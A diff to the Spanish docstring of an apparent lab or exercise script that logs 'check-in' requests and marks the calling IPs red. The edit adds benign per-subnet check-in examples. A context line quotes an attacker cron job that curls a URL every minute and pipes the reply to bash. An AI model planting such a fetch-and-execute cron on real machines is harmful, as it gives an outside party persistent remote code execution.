@@ -22,8 +22,14 @@ En la maquina objetivo el cron del atacante hace algo como:
   * * * * * curl -s http://TU_IP:8081/checkin | bash
 Cada request queda registrada y mantiene esa IP en ROJO.
 
-Desde Windows PowerShell (una peticion):
-  Invoke-RestMethod -Uri "http://172.16.101.77:8081/checkin"
+El monitor escucha en todas las interfaces por defecto. Si el servidor tiene
+ambas IPs, puede recibir check-ins de las dos subnets:
+
+  Windows / subnet 101:
+    Invoke-RestMethod -Uri "http://172.16.101.77:8081/checkin"
+
+  Fedora / subnet 102:
+    curl -fsS -o /dev/null "http://172.16.102.58:8081/checkin"
 """
 
 import argparse
